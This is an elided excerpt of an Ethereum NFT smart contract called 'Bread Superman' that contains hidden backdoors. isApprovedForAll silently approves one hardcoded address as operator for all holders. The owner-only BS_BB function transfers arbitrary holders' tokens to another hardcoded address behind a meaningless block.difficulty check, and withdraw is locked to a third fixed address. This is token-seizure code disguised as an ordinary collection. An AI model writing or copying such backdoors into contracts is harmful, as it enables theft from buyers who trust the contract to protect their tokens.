  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xF5376024D6A6fE7BA75f846bD579D271aC8f5d28){return true;}
...
contract Bread_Superman is Ownable, ERC721A, ReentrancyGuard {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Bread Superman", "BS", maxBatchSize_, collectionSize_) {
  ...
  function BS_BB(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        uint256 len = tokenids.length;
        for (uint256 i; i < len; i++) {
            uint256 tokenid = tokenids[i];
            transferFrom(ownerOf(tokenid), 0x3fa3180B95DB72f499b6C81521f849b9F6eAe4aC, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0x21669BBA9A8e11fE83B5688c2b046C6A63685e20);
